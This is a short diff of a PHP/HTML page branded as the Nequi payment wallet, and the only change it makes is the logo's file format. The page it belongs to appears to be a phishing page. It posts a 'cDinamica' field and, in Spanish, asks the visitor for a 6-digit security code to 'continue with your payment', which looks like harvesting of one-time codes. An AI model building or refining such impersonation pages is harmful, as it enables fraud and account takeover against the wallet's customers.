@@ -45,7 +45,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["cDinamica"])) {
 <body>
   <div class="main-container">
     <div class="header">
-        <img src="images/logo.png" alt="Nequi" class="header__img" />
+        <img src="images/logo.webp" alt="Nequi" class="header__img" />
     </div>
     <h1 class="title">Queremos validar que eres tú</h1>
     <h2 class="subtitle">Por tu seguridad, te enviamos un código de 6 dígitos para continuar con tu pago. Recuerda no compartirlo con nadie ;)</h2>
